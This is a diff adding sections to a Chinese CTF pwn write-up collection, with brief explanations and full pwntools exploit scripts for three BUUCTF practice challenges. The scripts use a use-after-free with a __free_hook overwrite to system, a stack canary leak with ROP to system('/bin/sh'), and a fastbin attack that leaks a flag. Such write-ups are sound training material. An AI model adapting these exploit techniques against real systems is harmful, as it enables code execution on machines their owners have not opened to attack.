@@ -657,5 +657,230 @@ exp()
 ```  
 ## 0x20 roarctf_2019_easy_pwn  
 https://n0vice.top/2020/04/19/roarctf-2019-easypwn  
-## 0x21  
-咕咕咕……  
+## 0x21 gyctf_2020_document  
+这题思路如下  
+申请document0、document1，free document0，UAF，通过unsorted bin泄露libc_base  
+申请document2，会切割free掉的document0一部分作为存储document2的ptr的部分，剩下的放入small bin  
+free 1，进入unsorted bin，然后再次申请document3，此时剩下在small bin中的部分会变成document3的存储ptr的那部分，并且document3和document1用的是同一块内存  
+然后大概会长这样  
+```shell  
+pwndbg> x/70gx 0x5587eb907000
+0x5587eb907000:	0x0000000000000000	0x0000000000000021
+0x5587eb907010:	0x00005587eb907030	0x0000000000000001
+0x5587eb907020:	0x0000000000000000	0x0000000000000021
+0x5587eb907030:	0x00005587eb907170	0x0000000000000001
+0x5587eb907040:	0x6362626262626262	0x0000000000000021
+0x5587eb907050:	0x00005587eb9070e0 <==document3 ptr	0x0000000000000001
+0x5587eb907060:	0x6363636363636363	0x0000000000000051
+0x5587eb907070:	0x00007f1698eabb78	0x00007f1698eabb78
+0x5587eb907080:	0x6363636363636363	0x6363636363636363
+0x5587eb907090:	0x6363636363636363	0x6363636363636363
+0x5587eb9070a0:	0x6363636363636363	0x6363636363636363
+0x5587eb9070b0:	0x0000000000000050	0x0000000000000020
+0x5587eb9070c0:	0x00005587eb9070e0	0x0000000000000001
+0x5587eb9070d0:	0x0000000000000000	0x0000000000000091
+0x5587eb9070e0:	0x0068732f6e69622f	0x0000000000000010
+0x5587eb9070f0:	0x630068732f6e6962	0x6363636363636363
+0x5587eb907100:	0x6363636363636363	0x6363636363636363
+0x5587eb907110:	0x6363636363636363	0x6363636363636363
+0x5587eb907120:	0x6363636363636363	0x6363636363636363
+0x5587eb907130:	0x6363636363636363	0x6363636363636363
+0x5587eb907140:	0x6363636363636363	0x6363636363636363
+0x5587eb907150:	0x6363636363636363	0x6363636363636363
+0x5587eb907160:	0x0000000000000090	0x0000000000000091
+0x5587eb907170:	0x0068732f6e69622f	0x0000000000000010
+0x5587eb907180:	0x630068732f6e6962	0x6363636363636363
+0x5587eb907190:	0x6363636363636363	0x6363636363636363
+0x5587eb9071a0:	0x6363636363636363	0x6363636363636363
+0x5587eb9071b0:	0x6363636363636363	0x6363636363636363
+0x5587eb9071c0:	0x6363636363636363	0x6363636363636363
+0x5587eb9071d0:	0x6363636363636363	0x6363636363636363
+0x5587eb9071e0:	0x6363636363636363	0x6363636363636363
+0x5587eb9071f0:	0x0000000000000000	0x0000000000020e11
+```  
+然后我们把这个地方改成free_hook-0x10  
+那么chunk3的地址就会变成free_hook-0x10，然后再edit document3，就能把free_hook改成system了  
+exp：  
+```python  
+#!/usr/bin/env python
+#coding=utf-8
+from pwn import*
+from LibcSearcher import *
+import sys
+#context.log_level = 'debug'
+context.terminal = ['terminator','-x','sh','-c']
+binary = './gyctf_2020_document' 
+local = 1
+if local == 1:
+    p=process(binary)
+else:
+    p=remote("node3.buuoj.cn",28029)
+elf=ELF(binary)
+libc=elf.libc
+def add(name,sex,content):
+    p.recvuntil("choice : \n")
+    p.sendline("1")
+    p.recvuntil("name\n")
+    p.send(str(name))
+    p.recvuntil("sex\n")
+    p.send(str(sex))
+    p.recvuntil("information\n")
+    p.sendline(str(content))
+def free(index):
+    p.recvuntil("choice : \n")
+    p.sendline("4")
+    p.recvuntil("index : \n")
+    p.sendline(str(index))
+def edit(index,sex,content):
+    p.recvuntil("choice : \n")
+    p.sendline("3")
+    p.recvuntil("index : \n")
+    p.sendline(str(index))
+    p.recvuntil("sex?\n")
+    p.sendline(str(sex))
+    p.recvuntil("information\n")
+    p.send(str(content))
+def show(index):
+    p.recvuntil("choice : \n")
+    p.sendline("2")
+    p.recvuntil("index : \n")
+    p.sendline(str(index))
+def exp():
+    add("aaaaaaaa","bbbbbbbb","c"*112) # 0
+    add("aaaaaaaa","bbbbbbbb","c"*112) # 1
+    free(0)
+    show(0)
+    libc_base = u64(p.recvuntil('\x7f').ljust(8, '\x00')) - 0x3c4b78
+    malloc_hook = libc_base + libc.sym['__malloc_hook']
+    free_hook = libc_base + libc.sym['__free_hook']
+    system = libc_base + libc.sym['system']
+    log.success("libc_base==>" + hex(libc_base))
+    log.success("malloc_hook==>" + hex(malloc_hook))
+    log.success("free_hook==>" + hex(free_hook))
+
+    add("/bin/sh\x00","/bin/sh\x00","c"*112) # 2
+    free(1)
+    add("/bin/sh\x00","/bin/sh\x00","c"*112) # 3
+    gdb.attach(p)
+    payload = p64(0) + p64(0x21) + p64(free_hook-0x10) + p64(0x1) + p64(0) + p64(0x51)
+    payload += "\x00"*(112-len(payload))
+    edit(0,"N",payload)
+    payload = p64(system)
+    payload += "\x00"*(112-len(payload))
+    edit(3,"N",payload)
+    free(1)
+    
+    p.interactive()
+exp()
+```  
+## 0x22  others_babystack  
+覆盖canary的低位\x00，将字符串和canary连起来，泄露出canary，然后ROP  
+exp：  
+```python  
+#!/usr/bin/env python
+#coding=utf-8
+from pwn import*
+from LibcSearcher import *
+import sys
+context.log_level = 'debug'
+context.terminal = ['terminator','-x','sh','-c']
+binary = './babystack' 
+local = 0
+if local == 1:
+    p=process(binary)
+else:
+    p=remote("node3.buuoj.cn",26702)
+elf=ELF(binary)
+libc=elf.libc
+pop_rdi_ret = 0x0000000000400a93    
+def exp():
+    p.recvuntil(">> ")
+    p.sendline("1")
+    payload = "a"*133 + "bbbb"
+    p.send(payload)
+    p.recvuntil(">> ")
+    p.sendline("2")
+    p.recvuntil("bbbb")
+    canary = p.recv(7).rjust(8,"\x00")
+    canary = u64(canary)
+    log.success("canary==>" + hex(canary))
+    p.recvuntil(">> ")
+    p.sendline("1")
+    payload = "a"*0x88 + p64(canary) + "a"*8 + p64(pop_rdi_ret) + p64(elf.got['__libc_start_main']) + p64(elf.plt['puts']) + p64(0x400908)
+    p.send(payload)
+    p.recvuntil(">> ")
+    p.sendline("3")
+    libc_start_main_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
+    #libc_start_main_addr = u32(p.recvuntil('\xf7')[-4:])
+    libc_base = libc_start_main_addr - libc.sym['__libc_start_main']
+    log.success("libc_start_main_addr==>" + hex(libc_start_main_addr))
+    log.success("libc_base==>" + hex(libc_base))
+    system = libc_base + libc.sym['system']
+    binsh = libc_base + libc.search("/bin/sh").next()
+    one_gadget = libc_base + 0x45216
+    payload = "a"*0x88 + p64(canary) + "a"*8 + p64(pop_rdi_ret)  + p64(binsh) + p64(system)
+    p.recvuntil(">> ")
+    p.sendline("1")
+    p.send(payload)
+    p.recvuntil(">> ")
+    p.sendline("3")
+    p.interactive()
+exp()
+```  
+## 0x23 gyctf_2020_some_thing_exceting  
+这题将flag读到了程序中，所以只需要leak出flag就行了  
+但是我想fastbin attack打一下getshell看看，但是出了点问题  
+fastbin构造成chunk0->chunk1->chunk0这样的时候，泄露不出地址了，接收不到0x7f开头的地址样子的东西了  
+不知道为什么  
+后面再补（挖坑待填）  
+exp:  
+```python  
+#!/usr/bin/env python
+#coding=utf-8
+from pwn import*
+from LibcSearcher import *
+import sys
+context.log_level = 'debug'
+context.terminal = ['terminator','-x','sh','-c']
+binary = './gyctf_2020_some_thing_exceting' 
+local = 1
+if local == 1:
+    p=process(binary)
+else:
+    p=remote("node3.buuoj.cn",29130)
+elf=ELF(binary)
+libc=elf.libc
+flag = 0x6020a8
+def add(size_ba,size_na,content_a,content_b):
+    p.recvuntil("do :")
+    p.sendline("1")
+    p.recvuntil("length : ")
+    p.sendline(str(size_ba))
+    p.recvuntil("ba : ")
+    p.send(content_a)
+    p.recvuntil("length : ")
+    p.sendline(str(size_na))
+    p.recvuntil("na : ")
+    p.send(content_b)
+def free(index):
+    p.recvuntil("do :")
+    p.sendline("3")
+    p.recvuntil("ID : ")
+    p.sendline(str(index))
+def show(index):
+    p.recvuntil("do :")
+    p.sendline("4")
+    p.recvuntil("ID : ")
+    p.sendline(str(index))
+def exp():
+    add(0x60,0x60,"aaaa","bbbb") # 0
+    add(0x60,0x60,"cccc","dddd") # 1
+    free(0)
+    free(1)
+    add(16,0x60,p64(flag),p64(flag))
+    show(0)
+    p.interactive()
+exp()
+```  
+## 0x24  
+咕咕咕……   
